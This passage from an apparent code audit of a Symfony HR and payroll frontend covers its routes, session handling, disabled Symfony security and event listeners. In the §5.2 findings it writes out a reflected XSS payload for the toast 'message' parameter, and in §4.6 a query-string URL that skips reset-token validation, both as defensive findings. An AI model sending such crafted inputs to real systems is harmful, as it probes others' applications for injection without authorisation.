| `/form/submit_shifts` `/form/update_shifts` `/form/archive_shifts` | ditto | redirect to `adm_shifts` | `POST api/create/shifts`, `PUT api/shifts/{id}`, `PATCH api/shifts/archive/{id}` |

Twig variable names are minimal and inconsistent: `divisions`, `employees_list`, `departments`,
`owners`, `models`, `model_types`, `shiftList`, `userTypes`, `employees`, `pagination`,
plus a vestigial `'controller_name' => 'AdministrationController'` passed to almost every render.

### 3.3 `ManpowerController` (1285 lines) — employees, DTR, employee-projects

| Route | Name | Template / Output | Data fetch |
|---|---|---|---|
| `manpower/employee` | `app_employee` | `manpower/apps-employees.html.twig` | SSR-proxy `getDivisionList`, `getAffiliatedCompany`, `getEmployeesPaginated` |
| `manpower/subdivisions` | `app_subdivision` | `manpower/apps-subdivision.html.twig` | Static (early `redirectToRoute('login')` guard) |
| `manpower/attendance/{id}/{emp_code}` | `app_manpower` | `manpower/apps-manpower.html.twig` | SSR-proxy `getProject`, `GET api/employee/profile` + **Direct-JS (21 `apiCall`s — the heaviest SPA-ish screen)** |
| `manpower/daily-time-records` | `app_attendance` | `manpower/apps-attendance.html.twig` | SSR-proxy `getWorker`, `getProject`, `getEmpProjects`, `getEmployees` + **Direct-JS (4)** |
| `manpower/employee-projects` | `app_emp_projects` | `manpower/apps-emp-project.html.twig` | SSR-proxy `getPhase`, `getSubdivision`, `getProject`, `getEmpProjects` |
| `manpower/employee-project/{id}` | `app_emp_project_id` | `manpower/apps-emp-project.html.twig` | SSR-proxy — **declared TWICE (L174 and L201) with the same path and name** |
| `manpower/employee-project-json/{id}` | `app_emp_project_json` (GET) | **JsonResponse** | JSON-proxy for `$.ajax` in `apps-project.html.twig` |
| `form/submit_employee` | `submit_employee` | redirect | `POST api/employee201/create` |
| `form/update/employee` | `update_employee` | redirect | `PUT api/employee201/update` |
| `/import/employee201` | `import_emp201` | `manpower/apps-employees.html.twig` | CSV preview |
| `/import-csv` | `import_csv` | redirect | `POST api/employee201/create_list` |
| `/employee_project/create` | `create_employee_project` (POST) | redirect | `POST api/employee_project/create` |
| `/form/submit_task` | `submit_emp_task` | redirect | `POST api/emp-tasks/create` |
| `/form/submit-dtr-task` | `submit_emp_dtr_task` | redirect | `POST api/emp-tasks-dtr/create` |
| `/form/archive-employee-project` | `archive_emp_proj` | redirect | `DELETE api/employee-projects/archive/{id}` |
| `/form/add-employee` | `add_emp_proj` | redirect | `POST api/employee-projects/create` |
| `/form/unassign-employee` | `unassign_emp_proj` | redirect | `POST api/employee-projects/unassign` |
| `/manpower/export_xls` | `export_xls` | **XLSX file** | `POST api/dtr-filter-by-activity | -emp | -project` → `ExportXLSService` |
| `/import-dtr` | `import_dtr` | redirect | `POST api/worker_logs/create` |

`exportXls()` is the canonical "fetch-then-render-file" pattern:

```php
$apiResponse = $this->apiService->apiRequest('POST', 'api/dtr-filter-by-activity', json_encode($filterArray), $token);
$data = $apiResponse->toArray();
$response = $this->exportxls->exportTasks($filterArray, $data);
...
return $response;
```

### 3.4 `ProjectManagementController` (1106 lines)

| Route | Name | Template / Output | Data fetch |
|---|---|---|---|
| `project/subdivisions` | `subdivision` | `project_management/apps-subdivision.html.twig` | SSR-proxy `getSubdivision`, `getPhase` |
| `project/project` | `project` | `project_management/apps-project.html.twig` | SSR-proxy `getProject`, `getSubdivision` + **Direct-JS (3)** + 5 `$.ajax` to Symfony |
| `project/category` | `category` | `project_management/apps-category.html.twig` | SSR-proxy `getCategory`, `getProject`, `getModel`, `getPhase` |
| `project/phase` | `phase` | `project_management/apps-phase.html.twig` | SSR-proxy `getPhase`, `getSubdivision` + 2 `$.ajax` to `update_blocks` |
| `project/subwizard` | `subwizard` | `project_management/subdivision-wizard.html.twig` | SSR-proxy `getPhase/getSubdivision/getModel/getCategory/getOwner` + Direct-JS (1) |
| `/form/submit_subdivision` `/form/update_subdivision` `/form/delete_subdivision` | `submit_form` / `update_subdivision_form` / `delete_subdivision_form` | redirect | `POST api/subdivision/create|update|delete` |
| `/project/update_subdivision` `/project/delete_subdivision` | `project_update_subdivision_form` / `project_delete_subdivision_form` | redirect | `POST api/project/subdivision/update`, `POST api/subdivision/delete` |
| `/form/submit_project` `/form/update_project` `/form/delete_project` | … | redirect | `POST api/project/create|update|delete` |
| `/form/submit_phase` `/form/update_phase` `/form/delete_phase` | … | redirect | `POST api/phase/create|update|delete` |
| `/form/submit_category` `/form/update_category` `/form/delete_category` | … | redirect | `POST api/category/create|update|delete` |
| `/wizard/create_project` | `wizard_project` | redirect / render | `POST api/wizard/create` |
| `/blocks/update_blocks` | `update_blocks` (POST) | **JsonResponse** | `POST api/blocks/update` |
| `/subdivision_profile/select` | `select_subdivision_profile` (POST) | **JsonResponse** | `POST api/subdivision_profile/select` |
| `/form/assign-workers-to-projects` | `assign_workers_to_projects` | **JsonResponse** | `POST api/project/assign-workers` |
| `/form/update-selected-project` | `update_selected_project_workers` | **JsonResponse** | `POST api/project/assign-workers-with-status` |

### 3.5 `EmployeeProfileController` (797 lines) — the biggest single page

`GET /employee/profile/{employee_code}` → `employee_profile/apps-employee-profile.html.twig`.
It performs **13 sequential API calls** plus Redis lookups before rendering:

`getDivisionList`, `GET api/employee/profile`, `GET api/employee/additional_record`,
`GET api/employee/view_attachment`, `getProjectUsingEmpRecord`, `getEmpLeaveRequest`,
`getEmpLeaveEntitlements`, `getLeavePolicy`, `getOvertimeRequest`, `getEmployeePayrollProfiles`,
`getAccountabilityRecordsByEmployee`.

Redis usage (the only real caching in the app) — `src/Controller/EmployeeProfileController.php` L110-133:

```php
$empKey = 'employee_' . $employee_code;
...
$employeeCache = $this->cache->getItem($empKey);
if (!$employeeCache->isHit()) {
    $logger->info('Employee Cache miss. Fetching data from API.');
    $employeeResponse = $this->apiService->apiRequest('GET', 'api/employee/profile', json_encode($formData), $token);
    $employee = $employeeResponse->toArray();
    $employeeCache->set($employee);
    $employeeCache->expiresAfter(86400); // Cache for 24 hour
    $this->cache->save($employeeCache);
} else {
    // Get data from the cache
    $employeeResponse = $this->apiService->apiRequest('GET', 'api/employee/profile', json_encode($formData), $token);
    $employee = $employeeResponse->toArray();
    // $employee = $employeeCache->get();
    $logger->info('Employee Cache hit. Using cached data.');
}
```

> The "cache hit" branch **re-fetches from the API anyway** and ignores the cached value (the read is
> commented out). The cache is written but never read for the employee record — pure overhead.
> Attachments (`attachment_{code}`) *are* read from cache and invalidated on upload/delete
> (`$this->cache->deleteItem($empAttachmentKey)`). The cache key contains no user/tenant scope, so it
> is shared across all logged-in users.

Twig variables handed to the profile template (L251-272):
`controller_name, worker_id, employee_code, employeeData, provinces, townCities, divisions,
employeeAdditionalRecord, employeeAttachment, javascriptSnippet, projects, payrollProfile,
leaveEntitlements, leaveHistory, leave_entitlements, leave_request, employee_id, leave_policies,
emp_overtime_request, accountability_records`
(note `leaveEntitlements`/`leaveHistory` are hardcoded `[]` alongside the real `leave_entitlements`).

Other routes: `/form/submit/upload_attachment` (**declared twice with the same name — L275 commented,
L363 live**), `/download/attachment/{employee_code}/{file}`, `/delete/attachment/{employee_code}/{id}`,
`/profile-create-leave`, `/profile-update-overtime-request`, `/profile-create-overtime-request`,
`/accountability-record-create`, `/update-accountability-record`, `/upload-profile-picture`.

**Files are stored on the frontend server, not the API.** `uploadAttachment()` writes to
`%kernel.project_dir%/public/uploads/{empCode}/` (parameter `uploads_directory` in
`config/services.yaml`) and then posts the *local absolute path* to the backend:

```php
$employeeUploadDir = $this->getParameter('uploads_directory') . '/' . $empCode;
if (!file_exists($employeeUploadDir)) { mkdir($employeeUploadDir, 0755, true); }
$file->move($employeeUploadDir, $originalFileName);
$employeeData = [
    "employee_code" => $empCode, "type" => $type,
    "attachment_name" => $fileName, "attachment_size" => $fileSize,
    "file" => $filePath,                       // ← absolute filesystem path of the *frontend* box
    "original_file_name" => $originalFileName
];
$response = $this->apiService->apiRequest('POST', 'api/employee/upload_attachment', json_encode($employeeData), $token);
```

Uploads land under `public/`, i.e. **directly web-servable without authentication** if the filename is known.

### 3.6 `PayrollReportsController` (450 lines) — 10 XLSX report generators

`GET /payroll-reports` → `payroll_reports/payroll_reports_generation.html.twig` with `companyList`.
The other 9 routes are POST-from-form endpoints that fetch and stream a spreadsheet:

| Route | Name | API call(s) | `ExportXLSService` method |
|---|---|---|---|
| `/generate-mandatories-report` | `generate_mandatories_report` | `GET api/timesheet` | `generateTimeSheetReport` |
| `/generate-payrollsheet-report` | `generate_payroll_sheet` | `GET api/payrollsheet` | `generatePayrollSheetReport` |
| `/generate-payrollregister-report` | `generate_payroll_register` | `GET api/payrollsheet` | `generatePayrollRegisterReport` |
| `/generate-taxshield-report` | `generate_taxshield_report` | `GET api/payrollsheet-with-taxshield` | `generateTaxShieldReport` |
| `/generate-cashadvance-report` | `generate_cashadvance_report` | `GET api/payrollsheet-with-cash-advances` | `generateCashAdvanceReport` |
| `/generate-salaryadjustment-report` | `generate_salaryadjustment_report` | `GET api/payrollsheet-with-salary-adjustment` | `generateSalaryAdjustmentsReport` |
| `/generate-govdues-report` | `generate_govdues` | `GET api/payrollsheet` + `GET api/gov-total-dues` | `generateContributionReport` |
| `/generate-company-govdues-report` | `generate_company_govdues` | `GET api/payrollsheet` + `GET api/company-gov-total-dues` | `generateTotalContributionReport` |
| `/generate-payrollsummary-report` | `generate_payrollsummary` | `GET api/payrollsheet` + `GET api/get-payroll-summary` | `generatePayrollSummaryReport` |

All of them send a **JSON body on a `GET` request** and hardcode 2024 fallback dates:

```php
$dateFrom = $request->request->get('date_from', '2024-10-01');
$dateTo   = $request->request->get('date_to',   '2024-10-31');
$date_start = $request->request->get('payroll_date_range', "2024-10-01 to 2024-10-31");
...
list($dateFrom, $dateTo) = explode(' to ', $date_start);
$formData = ['dateFrom' => $dateFrom, 'dateTo' => $dateTo];
$response = $this->apiService->apiRequest('GET', 'api/timesheet', json_encode($formData), $token);
```

### 3.7 Remaining controllers

| Controller | Lines | Routes | Templates | Notes |
|---|---|---|---|---|
| `EmployeePayrollController` | 408 | `/employee-payroll`, `/generate-employee-payslip`, `/generate-payroll`, `/update-salary-adjustment`, `/update-salary-adjustment-v2`, `/generate-all-payroll`, `/generate-payroll-report` | `payroll/apps-hr-payroll-employee.html.twig`, `payroll/apps-hr-employee-payslip.html.twig` | Vars: `emp_list_payroll`, `salary_totals`, `payroll_groups`, `selectedYear`. `-v2` suffix indicates a live-alongside rewrite. |
| `EmployeePayrollProfileController` | 185 | `/employee/payroll/profile[/save|/update/{id}|/delete/{id}]` | `employee_payroll_profile/employees-payroll-profile.html.twig` | `PUT/DELETE "api/employee-payroll-profile/{update,delete}/$id"` |
| `LeaveRequestController` | 140 | `/leave-request/`, `/leave-request/calendar`, `/leave-request/create`, `/leave-request/approve` | `leave_request/apps-leave-request.html.twig`, `apps-leave-calendar.html.twig` | Vars: `leave_requests`, `leave_policies`, `employee_leaves`, `holidays` |
| `LeavePolicyController` | 186 | `/leave-policy/`, `/leave-policy/create` (**declared twice, same name `app_leave_policy_create`**), `/leave-policy/update` | `leave_policy/leave_policy.html.twig` | The first `create` body wrongly posts to `api/pagibigconfig/create` and redirects to `app_pagibig_config` — copy-paste bug (dead: overridden by the second declaration). |
| `EmployeeLeavesController` | 119 | `/employee-leaves/`, `/update`, `/update-selected-leaves` | `leave_policy/employee_leave.html.twig` | |
| `HolidayController` | 242 | `/holidays/`, `/create`, `/update`, `/delete`, `/bulk-add-holidays`, `/yearly-holiday/update`, `/yearly-holiday/delete` | `holiday/apps-holiday.html.twig` | |
| `OvertimeRequestController` | 141 | `/overtime/request`, `/profile-update-overtime-request` (**name `update_overtime_request_v2`, path collides with `EmployeeProfileController`'s `update_overtime_request`**), `/profile-update-overtime-request-status` | `administration/overtime_request.html.twig` | Real duplicate-path collision across two controllers. |
| `SSSConfigController` | 246 | `/sss/config`, `/create-sss/config`, `/update-sss/config`, `/delete-sss/config`, `/import-sss/config` (POST, CSV) | `sss_config/sss_config.html.twig` | `DELETE "api/sssconfig/delete/".$id` (L143) — the only config controller that concatenates rather than interpolates. |
| `BIRConfigController` | 240 | `/bir/config`, `/create-bir/config`, `/update-bir/config`, `/delete-bir/config`, `/import-tax/config` | `bir_config/bir_config.html.twig` | |
| `PagibigConfigController` | 141 | `/pagibig/config[/create|/update|/delete]` | `pagibig_config/pagibig_config.html.twig` | |
| `PhilHealthConfigController` | 141 | `/philhealth/config`, `/create-philhealth/config`, `/update-philhealth/config`, `/delete-philhealth/config` | `phil_health_config/philhealth_config.html.twig` | |
| `SuperAdminController` | 354 | `/super/admin`, `/super/user-roles`, `/form/update_role_access`, `/form/delete/user-roles`, `/form/create/user-roles` | `super_admin/workers_sync.html.twig`, `super_admin/roles_permission.html.twig` | `update_role_access` hand-assembles a ~190-line permission matrix from `$request->request->get(...)` before `PUT api/main-modules/{id}` |
| `PayrollController` | 62 | `payroll/payslip/create`, `payroll/payslip`, `payroll/empPayroll` | `payroll/apps-hr-payroll-create-payslip.html.twig`, `apps-hr-payroll-employee-salary.html.twig`, `apps-hr-payroll-payslip.html.twig` | **Bypasses `APIRequest` entirely** — see below |
| `Employee201Controller` | 17 | `/employee201/forms` | `employee201/forms-validation.html.twig` | Stub |
| `ErrorController` | 28 | `/error/{statusCode}` | — | Redirects to `Referer` (open-redirect-ish; falls back to `home`) |

`PayrollController::viewEmployeePayroll()` is the only place that talks to the API **without the
service layer**, with the URL inlined:

```php
$token = $request->getSession()->get('token');
$authorizationToken = 'Bearer '.$token;
$httpClient = HttpClient::create();
$response = $httpClient->request('GET', 'http://127.0.0.1:8000/api/subdivision',[
    'headers' => [
        'Content-Type' => 'application/json',
        'Authorization' => $authorizationToken,
    ],
    'body' => $jsonBody
]);
if($response->getStatusCode() === 200){
    $responseData = $response->toArray();
    return $this->render('payroll/apps-hr-payroll-payslip.html.twig',[
        'subdivisions' => $responseData['subdivisions'],
    ]);
}
```

(It also has no `return` on the non-200 branch → PHP returns `null` → Symfony throws
`The controller must return a "Symfony\Component\HttpFoundation\Response" object`.)

---

## 4. Authentication & session handling

### 4.1 Symfony Security is effectively disabled

`config/packages/security.yaml` is the stock skeleton, **completely unused**:

```yaml
security:
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    providers:
        users_in_memory: { memory: null }
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            provider: users_in_memory
            logout:
                path: logout
                target: login # Redirect to login page after logout
                invalidate_session: true # Invalidate session when empty
    access_control:
        # - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY  }
        # - { path: ^/admin, roles: ROLE_ADMIN }
        # - { path: ^/, roles: ROLE_USER }
```

* Provider is `memory: null` → **no users exist**, so no authenticator can ever succeed.
* **No authenticator is configured at all** (no `form_login`, no `custom_authenticators`).
* **`access_control` is entirely commented out** → Symfony enforces *zero* URL authorisation.
* The `logout` key points at route name `logout`, which is `HomeController::logout()` at
  `/auth-logout-boxed`; `config/routes/security.yaml` loads `security.route_loader.logout`. Because
  the firewall has no authenticator and the app never calls `$this->getUser()`, the Security component
  contributes nothing beyond the logout route wiring.
* `framework.yaml` has **`#csrf_protection: true` commented out** → CSRF is globally off.

**All real access control is therefore done by `App\EventListener\SessionListener` and by
JavaScript in `permission.js`.**

### 4.2 Login flow (step by step)

1. **Render**: `GET /login` → `HomeController::login()` → `templates/auth-login-boxed.html.twig`.
   The form is a plain HTML POST, no CSRF token field:

   ```twig
   <form novalidate action="{{ path('validate_login')}}" method="post">
       ...
       <input type="text"     id="identifier" name="identifier" ... placeholder="Enter useremail ">
       <input type="password" id="password"   name="password"   ... placeholder="Enter password">
       <input id="checkboxDefault1" ... type="checkbox" value="">   {# "Remember me" — value is never read #}
       <button type="submit" ...>Sign In</button>
   </form>
   ```

2. **Submit**: `POST /validate_login` → `HomeController::validateLogin()`:

   ```php
   $identifier = $request->request->get('identifier');
   $password   = $request->request->get('password');
   // Make API request
   $response = $this->apiService->apiRequest('POST', 'api/login', json_encode(['identifier' => $identifier, 'password' => $password]), '');
   ```

   The credentials are proxied to the backend over plain JSON; the empty `''` token still produces an
   `Authorization: Bearer ` header.

3. **On failure** (`$response` is the error array) → `redirectToRoute('login', ['status'=>…, 'error'=>…,
   'message'=>'Login failed. Please check your credentials and try again.', 'fromLogin'=>true])`.
   The failure message is carried in the **URL query string**, which `AlertListener` later turns into a toast.

4. **On success** → `setSessionVariables()` then `redirectToRoute('dashboard', ['status'=>200,
   'error'=>'', 'message'=>'Welcome!', 'fromLogin'=>true])`.

   ```php
   private function setSessionVariables(Request $request, array $data): void
   {
       $session = $request->getSession();
       $session->set('user_id',            $data['user_id']);
       $session->set('username',           $data['username']);
       $session->set('token',              $data['token']);          // ← raw JWT, plaintext, PHP file session
       $session->set('userTypeCode',       $data['user_type_code']);
       $session->set('userTypeName',       $data['user_type_name']);
       $fullname = $data['first_name']. ' ' .$data['last_name'];
       $session->set('fullname',           $fullname);
       $session->set('empCode',            $data['empCode']);
       $session->set('main_module_access', $data['main_module']);    // ← RBAC matrix
       $session->set('sub_module_access',  $data['sub_module']);     // ← RBAC matrix
       $session->set('profile_image_path', $data['profile_image']);
   }
   ```

   > The identical method is **duplicated verbatim** in `SessionListener::setSessionVariables()`
   > (`src/EventListener/SessionListener.php` L85-99).

   Note the dead `$allowedUserTypes = ["SADM", "ADM", "HR"];` check: the `if (in_array(...))` guard and
   its `else` branch are commented out (L104, L114-123), so **any** user type can log in, and the
   `return $this->redirectToRoute('login', ...)` at L117-122 is unreachable code.

5. **Session cookie**: standard `PHPSESSID`, configured in `config/packages/framework.yaml`:

   ```yaml
   session:
       handler_id: null
       cookie_secure: auto
       cookie_samesite: lax
       storage_factory_id: session.storage.factory.native
   ```

   `handler_id: null` = native PHP handler → **files on disk** (`session.save_path`). No `cookie_httponly`
   override (Symfony defaults to `true`), no explicit `cookie_lifetime` / `gc_maxlifetime` → PHP defaults
   (typically 24 min idle). No `session.storage` in Redis despite Redis being available.

### 4.3 How the token is attached on subsequent requests

* **Server-side (Path A)**: each controller/`APIFunctions` method reads
  `$request->getSession()->get('token')` and passes it to `APIRequest::apiRequest()`, which sets
  `Authorization: Bearer <jwt>`. 84 literal occurrences of `getSession()->get('token')` in `src/`.
* **Browser-side (Path B)**: `api.js::getToken()` calls `GET /validate_call`, receives
  `{"token":"<jwt>"}`, memoises it in `cachedToken`, and sets the `Authorization` header itself.
  Once fetched, the JWT lives in a JS variable for the lifetime of the page and is visible to any
  script on the page (and to anything that can read the JSON response).

### 4.4 Session revalidation on **every** request — `SessionListener` (100 lines)

Registered explicitly in `config/services.yaml`:

```yaml
App\EventListener\SessionListener:
    arguments:
        $requestStack: '@request_stack'
        $logger: '@logger'
        $router: '@router'
    tags:
        - { name: kernel.event_listener, event: kernel.request, method: onKernelRequest }
```

```php
public function onKernelRequest(RequestEvent $event)
{
    $request = $event->getRequest();
    $session = $request->getSession();
    $currentRoute = $request->attributes->get('_route');
    $allowedRoutes = ['login','validate_login', 'forget_password', 'reset_password', 'email_forget_password', 'form_reset_password'];
    if (!in_array($currentRoute, $allowedRoutes) && $session && !$session->has('token')) {
        $sessionId = $session->getId();
        $token = $session->get('token');

        $this->logger->info('session id: ' . $sessionId);
        $this->logger->info('token: ' . ($token ?: 'No token in session'));

        // Render login template instead of redirecting
        $javascriptSnippet = '';
        $content = $this->twig->render('auth-login-boxed.html.twig', [
            'javascriptSnippet' => $javascriptSnippet,
        ]);
        $event->setResponse(new Response($content));
        return; // Ensure no further processing
    }

    if ($session->has('user_id') && $session->has('token') && !in_array($currentRoute, $allowedRoutes)) {
        $userId = $session->get('user_id');
        $token = $session->get('token');

        $response = $this->apiService->apiRequest('POST', 'api/revalidate-session', json_encode(['user_id' => $userId]), $token);
        if(!is_array($response)){
            $responseData = $response->toArray();
            $this->setSessionVariables($request, $responseData);
        }
        else{
            $this->logger->info('Invalid session revalidation response');
            $content = $this->twig->render('auth-login-boxed.html.twig', ['javascriptSnippet' => '']);
            $event->setResponse(new Response($content));
            return;
        }
    }
}
```

Key behaviours and consequences:

* **Unauthenticated users are not redirected.** The listener *renders the login page inline* with a
  `200 OK` at whatever URL was requested. So `GET /employee/profile/EMP-001` unauthenticated returns
  HTTP 200 containing the login form. Bookmarks/back-button therefore behave oddly, and the browser
  URL never becomes `/login`.
* **`POST api/revalidate-session` fires on literally every request** that has a session — including
  every asset request that hits PHP, every AJAX call to a Symfony JSON route, and every form POST.
  This is one extra synchronous HTTP round-trip per page view, on top of the page's own API calls.
* Session variables (including the RBAC matrices) are **rewritten from the API on every request**, so
  permission changes take effect immediately — at the cost of the round-trip above.
* If revalidation fails for **any** reason (API down, 500, network blip), the user is silently shown
  the login page — the session is *not* cleared, so a refresh may succeed again.
* `$router` is injected and stored but never used (a `RedirectResponse` import is also unused).
* The `allowedRoutes` whitelist is by **route name**, so the `home` route (`/`) is *not* whitelisted:
  an anonymous visitor to `/` gets the inline login page from the listener before `HomeController::index()`
  ever runs.
* `/validate_call` (`get_token`) is **not** in `allowedRoutes` — correct, it requires a session — but it
  is also not protected by anything else.

### 4.5 Logout & expiry

```php
#[Route('/auth-logout-boxed', name: 'logout')]
public function logout(Request $request): Response
{
    $session = $request->getSession();
    $session->invalidate();
    return $this->render('auth-login-boxed.html.twig');
}
```

* Local session only. **The JWT is never revoked at the API** — no `POST /api/logout` call exists
  anywhere in `src/` or in the JS. A copied token stays valid until it expires server-side.
* `session->invalidate()` regenerates the id and clears data; the response is a rendered login page
  (200), not a redirect, so the URL stays `/auth-logout-boxed`.
* There is also a second logout wiring via the Symfony firewall (`logout: path: logout, target: login,
  invalidate_session: true`). Because the route name `logout` is claimed by `HomeController`, the
  controller wins; the firewall config is decorative.
* **Expiry**: there is no idle timer, no token-expiry check, no refresh-token flow in the frontend.
  Expiry manifests as `api/revalidate-session` returning an error → `SessionListener` renders the login
  page. On the Direct-JS screens, `cachedToken` keeps the expired JWT until the page is reloaded, so
  those screens degrade into a stream of red Toastify errors.
* `HomeController::revalidateSession()` (`/revalidate-session`, L127-155) is an unused manual endpoint;
  it *does* apply the `["SADM","ADM","HR"]` whitelist that the login path has commented out, and it calls
  `$response->getStatusCode()` without the array guard → 500 if the API errors.

### 4.6 Password reset

`GET /forget_password` → form → `POST /email_forget_password` → `POST api/forget_password` →
`EmailService::sendPasswordResetEmail($email, $firstName, $token)` builds
`{scheme}://{host}/reset_password/{token}` and mails it via `MAILER_DSN`.
`GET /reset_password/{token}` → `POST api/validate_reset_token` → renders
`forget_password/auth-create-password-basic.html.twig` with `isValid`, `status`, `token`.
`POST /form/submit/reset_password` → re-validates the token, then `POST api/reset_password`.

Note `resetPassword()` will accept `isValid`/`status` **straight from the query string**
(`$request->get('isValid', null)`) and short-circuit the token check:

```php
$isValid = $request->get('isValid', null);
$status  = $request->get('status', null);

if ($isValid != null && $status != null) {
    return $this->render('forget_password/auth-create-password-basic.html.twig', [
        'isValid' => $isValid, 'status' => $status, 'javascriptSnippet' => ''
    ]);
}
```

so `/reset_password/anything?isValid=1&status=Valid` renders the "set a new password" form without
validating the token. (The subsequent `POST /form/submit/reset_password` *does* re-validate, so this is
a UI-spoofing issue rather than a direct takeover — but the form is rendered without a `token` variable
in that branch, so the POST would fail.)

---

## 5. Event listeners

There are four listener classes in `src/EventListener/`. Only **three** are actually wired.

| Class | Lines | Event | Registered? | Purpose |
|---|---|---|---|---|
| `SessionListener` | 100 | `kernel.request` | ✅ explicit tag in `services.yaml` | Auth gate + per-request session revalidation (§4.4) |
| `AlertListener` | 45 | `kernel.response` | ✅ explicit tag | Injects a `showToast(...)` `<script>` into every HTML response |
| `NotificationListener` | 54 | `kernel.response` | ✅ explicit tag | Fetches notifications from the API into the session on every response |
| `AuthorizationCheck` | 34 | `kernel.exception` | ❌ **never registered** | Would convert `AccessDeniedException` → JSON 403 |

### 5.1 `AuthorizationCheck` — dead code

```php
class AuthorizationCheck
{
    private $requestStack;
    private $logger;
    private $router;

    public function onKernelException(ExceptionEvent $event)
    {
        $exception = $event->getThrowable();

        // Check if the exception is an AccessDeniedException
        if ($exception instanceof AccessDeniedException) {
            $response = new JsonResponse([
                'error' => 'Access Denied',
                'message' => 'You do not have permission to access this resource.',
            ], JsonResponse::HTTP_FORBIDDEN);

            $event->setResponse($response);
        }
    }
}
```

* It is **not tagged** `kernel.event_listener` in `config/services.yaml`, and it does **not** implement
  `EventSubscriberInterface`, so Symfony's `autoconfigure: true` will not register it either. It never runs.
* Even if it ran, it would be a no-op in practice: nothing in the codebase ever throws
  `Symfony\Component\Security\Core\Exception\AccessDeniedException` (`$this->denyAccessUnless…` /
  `#[IsGranted]` are used nowhere), because Symfony Security is inert (§4.1).
* Its three private properties are declared, never assigned, never used. There is no constructor.
* The file header comment still says `// src/EventListener/ExceptionListener.php`.

> **Answer to "how does `AuthorizationCheck` decide what to show" — it does not.** Authorization on the
> frontend is decided in two other places: (a) Twig `{% if app.session.get('userTypeCode') == 'SADM' %}`
> guards in `_sidebar.html.twig`, and (b) `public/assets/js/permission.js` hiding DOM nodes after load.

### 5.2 `AlertListener` — query-string-driven toasts

```php
public function onKernelResponse(ResponseEvent $event)
{
    $response = $event->getResponse();
    $statusCode = $response->getStatusCode();

    $request = $this->requestStack->getCurrentRequest();
    $message = $request->query->get('message') ?? '';
    $statusCode = $request->query->get('status');       // ← overwrites the real HTTP status

    $errorScript = '';
    if ($statusCode >= 200 && $statusCode < 300) {
        // Success toast
        $errorScript = "<script>showToast('Action completed successfully.', 'bg-green-500');</script>";
    } elseif ($statusCode >= 300) {
        $escapedMessage = json_encode($message);
        $errorScript = "<script>showToast({$escapedMessage}, 'bg-red-500');</script>";
    }

    // Inject the script into the response content (assuming a Twig template)
    $content = $response->getContent();
    $content = str_replace('</body>', $errorScript . '</body>', $content);
    $response->setContent($content);
}
```

* The message/status come from the **URL query string**, which is exactly what all the
  `redirectToRoute('division', ['status'=>…, 'error'=>…, 'message'=>…])` calls populate. So a form POST
  →redirect→GET cycle produces the toast on the landing page.
* `$message` is escaped with `json_encode()` before interpolation into a `<script>` — that blocks
  quote-breaking, but `json_encode` does **not** escape `</script>`, so a crafted
  `?message=</script><img src=x onerror=alert(1)>` is a **reflected XSS**. Nothing sanitises `message`,
  and it is entirely attacker-controllable via a link.
* `str_replace('</body>', …)` runs on **every** response, including `JsonResponse`s and XLSX binaries
  — for those the needle is absent so it is a wasted `getContent()`/`setContent()` copy of the whole
  body (potentially multi-MB spreadsheets).
* Redirect responses (302, empty body) also pass through harmlessly.
* When `status` is absent, PHP 8 evaluates `null >= 200` as `false` and `null >= 300` as `false`, so no
  toast is injected — the intended behaviour, by accident.
* Note the corresponding hook in `templates/partials/base.html.twig` line 70,
  `{{ errorScript|default('')|raw }}`, which sits *after* `</body>` — a separate, unrelated mechanism
  that no controller populates.

### 5.3 `NotificationListener` — an API call on every response

```php
public function onKernelResponse(ResponseEvent $event)
{
    $response = $event->getResponse();
    $statusCode = $response->getStatusCode();

    $request = $this->requestStack->getCurrentRequest();
    $message = $request->query->get('message') ?? '';
    $statusCode = $request->query->get('status');

    $session = $request->getSession();
    $token = $session->get('token');
    $userId = $session->get('user_id');

    // Collect form data
    $formData = [];

    // Send POST request to the API
    $apiResponse = $this->apiService->apiRequest('GET', 'api/notifications/find-by-employee/'.$userId, json_encode($formData), $token);
    if (is_array($apiResponse) && isset($apiResponse['error']) && $apiResponse['error'] === true) {
        $errorMessage = 'Error: Status code ' . $apiResponse['status'];
        $responseMessage = $apiResponse['message']['message'] ?? $errorMessage;
    } else {
        $responseMessage = $apiResponse->toArray();
    }

    // Store the response message in the session
    $session->set('notification_message', $responseMessage);
}
```

* Runs on **every response**, unconditionally — including the login page (where `$userId` is `null`, so
  it requests `api/notifications/find-by-employee/` with an empty Bearer token), including AJAX JSON
  responses, including file downloads.
* Combined with `SessionListener`, **every single page view costs two extra API round-trips**
  (`POST api/revalidate-session` + `GET api/notifications/find-by-employee/{id}`) before the page's own
  data fetching even counts.
* `$message`, `$statusCode`, `$formData`, `$statusCode` (the first one) are dead locals.
* `$apiFunctions` is injected via `services.yaml` and assigned to a typed property in the constructor
  signature — but the constructor body **never assigns `$this->apiFunctions`**, so the typed property
  stays uninitialised (harmless only because nothing reads it).
* Result is written to `session['notification_message']` and read purely in Twig.

### 5.4 `templates/partials/_notification-area.html.twig`

Rendered from `_topbar.html.twig`. It reads the session value directly — no controller passes it:

```twig
<div data-simplebar class="max-h-[350px]">
    <div class="flex flex-col gap-1" id="notification-list">
        {% set notifications = app.session.get('notification_message') %}
        {% if notifications is iterable %}
            {% for notification in notifications %}
                <a href="#!" class="flex gap-3 p-4 product-item hover:bg-slate-50 dark:hover:bg-zink-500">
                    <div class="grow">
                        <h6 class="mb-1 font-medium"><b>{{ notification.sender_fullname }}</b> {{ notification.action }}</h6>
                        <p class="mb-0 text-sm text-slate-500 dark:text-zink-300">
                            <i data-lucide="clock" class="inline-block size-3.5 mr-1"></i>
                            <span class="align-middle">{{ notification.datetime|date('l h:i A') }}</span>
                        </p>
                    </div>
                    <div class="flex items-center self-start gap-2 text-xs text-slate-500 shrink-0 dark:text-zink-300">
                        <div class="size-1.5 bg-custom-500 rounded-full"></div>
                        {% set now = date() %}
                        {% set notificationDate = date(notification.datetime) %}
                        {% set diff = now.diff(notificationDate) %}
                        {% if diff.y > 0 %}{{ diff.y }} year{{ diff.y > 1 ? 's' : '' }}
                        {% elseif diff.m > 0 %}{{ diff.m }} month{{ diff.m > 1 ? 's' : '' }}
                        ...
                        {% else %}{{ diff.s }} second{{ diff.s > 1 ? 's' : '' }}{% endif %}
                    </div>
                </a>
            {% endfor %}
        {% else %}
            <p>No notifications available.</p>
